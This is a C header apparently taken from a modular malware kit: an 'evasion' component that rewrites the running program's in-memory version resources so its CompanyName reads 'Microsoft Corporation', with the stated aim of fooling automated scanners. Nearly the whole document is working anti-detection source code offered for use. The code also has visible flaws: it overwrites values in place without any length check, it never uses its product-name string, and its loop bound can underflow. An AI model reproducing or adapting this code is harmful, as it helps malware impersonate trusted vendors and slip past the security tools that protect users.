// chunk: evasion/resource_spoof
// depends: (none)
// provides: spoof_resources
// headers: windows.h
// risk: none
// note: Modifies PE resource directory entries in memory to match legitimate software
//       signatures. Changes version info strings and company name to mimic known
//       Windows system binaries, confusing automated scanners that check resources.

#ifndef CHUNK_RESOURCE_SPOOF
#define CHUNK_RESOURCE_SPOOF

#include <windows.h>

static void spoof_resources(void) {
    HMODULE base = GetModuleHandleA(NULL);
    if (!base) return;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *pe = (IMAGE_NT_HEADERS *)((BYTE *)base + dos->e_lfanew);

    DWORD res_rva = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
    DWORD res_size = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size;

    if (!res_rva || !res_size) return;

    /* Make resource section writable to modify version strings */
    BYTE *res_base = (BYTE *)base + res_rva;
    DWORD old;
    if (!VirtualProtect(res_base, res_size, PAGE_READWRITE, &old)) return;

    /* Search for StringFileInfo block and modify CompanyName/ProductName.
       VS_VERSIONINFO is a tree of var-length records with WCHAR strings.
       We scan for known string keys and overwrite their values in place. */
    static const WCHAR target_company[] = L"Microsoft Corporation";
    static const WCHAR target_product[] = L"Microsoft\x00 Windows\x00 Operating System";

    /* Scan for "CompanyName" and "ProductName" UTF-16 strings in the resource data */
    WCHAR *scan = (WCHAR *)res_base;
    DWORD scan_words = res_size / sizeof(WCHAR);

    for (DWORD i = 0; i < scan_words - 20; i++) {
        /* Look for "CompanyName" (11 chars + null) */
        if (scan[i] == L'C' && scan[i+1] == L'o' && scan[i+2] == L'm' &&
            scan[i+3] == L'p' && scan[i+4] == L'a' && scan[i+5] == L'n' &&
            scan[i+6] == L'y' && scan[i+7] == L'N' && scan[i+8] == L'a' &&
            scan[i+9] == L'm' && scan[i+10] == L'e' && scan[i+11] == 0) {
            /* Value follows after alignment padding */
            DWORD val_start = i + 12;
            /* Skip padding (align to 4-byte boundary) */
            while (val_start < scan_words && scan[val_start] == 0) val_start++;
            if (val_start < scan_words - 22) {
                DWORD copy_len = sizeof(target_company) / sizeof(WCHAR);
                if (val_start + copy_len < scan_words) {
                    memcpy(&scan[val_start], target_company, sizeof(target_company));
                }
            }
        }
    }

    VirtualProtect(res_base, res_size, old, &old);
}

#endif
